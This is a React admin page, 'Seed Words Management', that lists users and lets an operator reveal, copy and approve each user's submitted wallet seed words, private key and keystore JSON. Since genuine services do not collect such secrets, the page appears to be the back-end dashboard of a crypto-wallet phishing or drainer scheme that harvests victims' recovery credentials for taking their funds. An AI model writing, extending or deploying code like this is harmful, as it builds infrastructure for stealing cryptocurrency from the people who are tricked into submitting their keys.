"use client"

import { useState, useMemo, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Search, Eye, EyeOff, Copy, Shield, Key, AlertTriangle } from "lucide-react"
import { toast } from "sonner"
import AdminTopNav from "../_components/AdminTopNav"

export default function SeedWordsPage({ initialUsers }) {
  const [users, setUsers] = useState(initialUsers)
  const [searchTerm, setSearchTerm] = useState("")
  const [visibleSeeds, setVisibleSeeds] = useState(new Set())
  const [selectedUser, setSelectedUser] = useState(null)
  const [loadingApproval, setLoadingApproval] = useState({ userId: null, itemType: null })
  const [loading, setLoading] = useState(false)

  // Fetch updated users on mount
  useEffect(() => {
    const fetchUsers = async () => {
      setLoading(true)
      try {
        const res = await fetch("/api/admin/get-user-seeds")
        const data = await res.json()
        setUsers(data.users)
      } catch (err) {
        toast("Failed to fetch users")
      } finally {
        setLoading(false)
      }
    }
    fetchUsers()
  }, [])

  // Filter users based on search term
  const filteredUsers = useMemo(() => {
    return users.filter(
      (user) =>
        (user.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        user.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        user.email?.toLowerCase().includes(searchTerm.toLowerCase()))
    )
  }, [users, searchTerm])

  // Calculate statistics
  const totalUsers = users.length
  const activeUsers = users.filter((user) => user.status === "active").length
  const inactiveUsers = users.filter((user) => user.status === "inactive").length
  const suspendedUsers = users.filter((user) => user.status === "suspended").length

  const toggleSeedVisibility = (key) => {
    setVisibleSeeds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(key)) {
        newSet.delete(key)
      } else {
        newSet.add(key)
      }
      return newSet
    })
  }

  const copyToClipboard = async (text, type) => {
    try {
      await navigator.clipboard.writeText(text)
      toast(`${type} copied to clipboard`)
    } catch (err) {
      toast("Failed to copy to clipboard")
    }
  }

  const copySeedWords = async (seedWords) => {
    const seedString = seedWords.join(" ")
    await copyToClipboard(seedString, "Seed words")
  }

  const getStatusColor = (status) => {
    switch (status) {
      case "active":
        return "bg-green-500/20 text-green-400 border-green-500/30"
      case "inactive":
        return "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"
      case "suspended":
        return "bg-red-500/20 text-red-400 border-red-500/30"
      default:
        return "bg-gray-500/20 text-gray-400 border-gray-500/30"
    }
  }

  const handleApproval = async (userId, itemType, status) => {
    setLoadingApproval({ userId, itemType });
    try {
      const res = await fetch("/api/admin/approve-seed-items", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, itemType, status }),
      });
      const data = await res.json();
      if (data.success) {
        toast(`${itemType} ${status === "approved" ? "approved" : "declined"}`);
        setUsers((prev) =>
          prev.map((u) =>
            u.id === userId
              ? { ...u, [`${itemType}Status`]: status }
              : u
          )
        );
      } else {
        toast("Failed to update status");
      }
    } catch (err) {
      toast("Error updating status");
    } finally {
      setLoadingApproval({ userId: null, itemType: null });
    }
  };

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-black text-white">
        <Key className="h-12 w-12 animate-spin mb-4 text-blue-400" />
        <p className="text-lg text-gray-400">Loading users...</p>
      </div>
    )
  }

  return (
  <div className="min-h-screen relative overflow-hidden bg-gradient-to-br from-[#1a012b] via-black to-[#001933] text-white">

    {/* Ambient background glows for modern dashboard feel */}
    <div className="absolute top-16 left-16 w-80 h-80 bg-purple-600/20 rounded-full blur-3xl opacity-20 animate-pulse" />
    <div className="absolute bottom-24 right-12 w-96 h-96 bg-blue-500/10 rounded-full blur-3xl opacity-10" />

    <div className="relative z-10 container mx-auto p-4 sm:p-6">
      <AdminTopNav />

      {/* Header */}
      <div className="mb-6 sm:mb-8">
        <div className="flex items-center gap-3 mb-4">
          <Key className="h-6 w-6 sm:h-8 sm:w-8 text-blue-400" />
          <h1 className="text-2xl sm:text-3xl font-bold">Seed Words Management</h1>
        </div>
        <Alert className="mb-6 bg-red-500/10 border-red-500/30 text-red-400">
          <AlertTriangle className="h-4 w-4" />
          <AlertDescription>
            <strong>Security Notice:</strong> Seed words provide full access to wallets. Handle with extreme caution and ensure secure environment.
          </AlertDescription>
        </Alert>
        <div className="relative max-w-md">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
          <Input
            placeholder="Search users by username, name or email..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-10 bg-white/5 backdrop-blur-md border border-white/20 text-white placeholder-gray-400"
          />
        </div>
      </div>

      {/* Users Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6 text-gray-400">
        {filteredUsers.map((user) => (
          <Card
            key={user.id}
            className="bg-white/5 backdrop-blur-xl border border-white/10 shadow-lg hover:bg-white/10 transition-colors"
          >
            <CardHeader className="pb-3">
              <div className="flex items-start gap-3">
                <Avatar className="h-10 w-10 sm:h-12 sm:w-12">
                  <AvatarImage src={user.avatar || "/placeholder.svg"} alt={user.username || user.name} />
                  <AvatarFallback className="bg-gray-200">
                    {(user.username || user.name || "").split(" ").map((n) => n[0]).join("")}
                  </AvatarFallback>
                </Avatar>
                <div className="min-w-0 flex-1">
                  <CardTitle className="text-base sm:text-lg truncate">{user.username || user.name}</CardTitle>
                  <p className="text-xs sm:text-sm text-gray-400 truncate">{user.email}</p>
                  <Badge className={`mt-1 text-xs ${getStatusColor(user.status)}`}>{user.status}</Badge>
                </div>
              </div>
            </CardHeader>

            <CardContent className="space-y-6">

              {/* Seed Words Section */}
              <div>
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs sm:text-sm text-gray-400">Seed Words</span>
                  <div className="flex gap-1">
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => toggleSeedVisibility(`seed-${user.id}`)}
                      className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                    >
                      {visibleSeeds.has(`seed-${user.id}`) ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                    </Button>
                    {visibleSeeds.has(`seed-${user.id}`) && (
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copySeedWords(user.seedWords)}
                        className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    )}
                  </div>
                </div>
                {visibleSeeds.has(`seed-${user.id}`) ? (
                  <div className="grid grid-cols-3 sm:grid-cols-4 gap-1 sm:gap-2">
                    {user.seedWords.map((word, index) => (
                      <div key={index} className="bg-gray-900/50 p-1.5 sm:p-2 rounded text-center text-white">
                        <span className="text-xs text-gray-500">{index + 1}</span>
                        <p className="text-xs sm:text-sm font-mono">{word}</p>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="bg-gray-900/50 p-4 rounded text-center">
                    <Shield className="h-6 w-6 mx-auto mb-2 text-gray-500" />
                    <p className="text-xs sm:text-sm text-gray-500">Click the eye icon to reveal seed words</p>
                  </div>
                )}
                <div className="flex items-center gap-2 mt-2">
                  <Badge className={`text-xs ${
                    !user.seedWords?.length
                      ? "bg-gray-600"
                      : user.seedWordsStatus === "approved"
                      ? "bg-green-600"
                      : user.seedWordsStatus === "rejected"
                      ? "bg-red-600"
                      : "bg-yellow-600"
                  }`}>
                    {!user.seedWords?.length ? "Not Submitted" : user.seedWordsStatus}
                  </Badge>
                  <Button
                    size="sm"
                    disabled={loadingApproval.userId === user.id && loadingApproval.itemType === "seedWords"}
                    onClick={() => handleApproval(user.id, "seedWords", "approved")}
                  >
                    {loadingApproval.userId === user.id && loadingApproval.itemType === "seedWords" ? (
                      <span className="animate-spin mr-2 inline-block h-4 w-4 border-2 border-t-transparent border-white rounded-full"></span>
                    ) : null}
                    Approve
                  </Button>
                  <Button
                    size="sm"
                    variant="destructive"
                    disabled={loadingApproval.userId === user.id && loadingApproval.itemType === "seedWords"}
                    onClick={() => handleApproval(user.id, "seedWords", "rejected")}
                  >
                    {loadingApproval.userId === user.id && loadingApproval.itemType === "seedWords" ? (
                      <span className="animate-spin mr-2 inline-block h-4 w-4 border-2 border-t-transparent border-white rounded-full"></span>
                    ) : null}
                    Decline
                  </Button>
                </div>
              </div>

              {/* Private Key Section */}
              <div>
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs sm:text-sm text-gray-400">Private Key</span>
                  <div className="flex gap-1">
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => toggleSeedVisibility(`private-${user.id}`)}
                      className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                    >
                      {visibleSeeds.has(`private-${user.id}`) ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                    </Button>
                    {visibleSeeds.has(`private-${user.id}`) && (
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(user.privateKey, "Private key")}
                        className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    )}
                  </div>
                </div>
                {visibleSeeds.has(`private-${user.id}`) ? (
                  <p className="text-xs sm:text-sm font-mono bg-gray-900/50 p-2 rounded break-all text-white">
                    {user.privateKey}
                  </p>
                ) : (
                  <div className="bg-gray-900/50 p-4 rounded text-center">
                    <Shield className="h-6 w-6 mx-auto mb-2 text-gray-500" />
                    <p className="text-xs sm:text-sm text-gray-500">Click the eye icon to reveal private key</p>
                  </div>
                )}
                <div className="flex items-center gap-2 mt-2">
                  <Badge className={`text-xs ${
                    !user.privateKey
                      ? "bg-gray-600"
                      : user.privateKeyStatus === "approved"
                      ? "bg-green-600"
                      : user.privateKeyStatus === "rejected"
                      ? "bg-red-600"
                      : "bg-yellow-600"
                  }`}>
                    {!user.privateKey ? "Not Submitted" : user.privateKeyStatus}
                  </Badge>
                  <Button size="sm" onClick={() => handleApproval(user.id, "privateKey", "approved")}>Approve</Button>
                  <Button size="sm" variant="destructive" onClick={() => handleApproval(user.id, "privateKey", "rejected")}>Decline</Button>
                </div>
              </div>

              {/* Keystore JSON Section */}
              <div>
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs sm:text-sm text-gray-400">Keystore JSON</span>
                  <div className="flex gap-1">
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => toggleSeedVisibility(`keystore-${user.id}`)}
                      className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                    >
                      {visibleSeeds.has(`keystore-${user.id}`) ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                    </Button>
                    {visibleSeeds.has(`keystore-${user.id}`) && (
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(JSON.stringify(user.keystoreJson, null, 2), "Keystore JSON")}
                        className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    )}
                  </div>
                </div>
                {visibleSeeds.has(`keystore-${user.id}`) ? (
                  <pre className="text-xs font-mono bg-gray-900/50 p-2 rounded overflow-x-auto max-h-32 overflow-y-auto text-white">
                    {JSON.stringify(user.keystoreJson, null, 2)}
                  </pre>
                ) : (
                  <div className="bg-gray-900/50 p-4 rounded text-center">
                    <Shield className="h-6 w-6 mx-auto mb-2 text-gray-500" />
                    <p className="text-xs sm:text-sm text-gray-500">Click the eye icon to reveal keystore JSON</p>
                  </div>
                )}
                <div className="flex items-center gap-2 mt-2">
                  <Badge className={`text-xs ${
                    !user.keystoreJson || Object.keys(user.keystoreJson).length === 0
                      ? "bg-gray-600"
                      : user.keystoreJsonStatus === "approved"
                      ? "bg-green-600"
                      : user.keystoreJsonStatus === "rejected"
                      ? "bg-red-600"
                      : "bg-yellow-600"
                  }`}>
                    {!user.keystoreJson || Object.keys(user.keystoreJson).length === 0
                      ? "Not Submitted"
                      : user.keystoreJsonStatus}
                  </Badge>
                  <Button size="sm" onClick={() => handleApproval(user.id, "keystoreJson", "approved")}>Approve</Button>
                  <Button size="sm" variant="destructive" onClick={() => handleApproval(user.id, "keystoreJson", "rejected")}>Decline</Button>
                </div>
              </div>

              {/* User Info */}
              <div className="grid grid-cols-2 gap-4 pt-2 border-t border-white/20">
                <div>
                  <span className="text-xs text-gray-400">Created</span>
                  <p className="text-xs sm:text-sm text-gray-400">{user.createdAt}</p>
                </div>
                <div>
                  <span className="text-xs text-gray-400">Last Access</span>
                  <p className="text-xs sm:text-sm text-gray-400">{user.lastAccess}</p>
                </div>
              </div>

            </CardContent>
          </Card>
        ))}
      </div>

      {filteredUsers.length === 0 && (
        <div className="text-center py-12">
          <Key className="h-12 w-12 mx-auto mb-4 text-gray-500" />
          <p className="text-gray-400 text-lg">No users found matching your search.</p>
        </div>
      )}
    </div>
  </div>
)

}
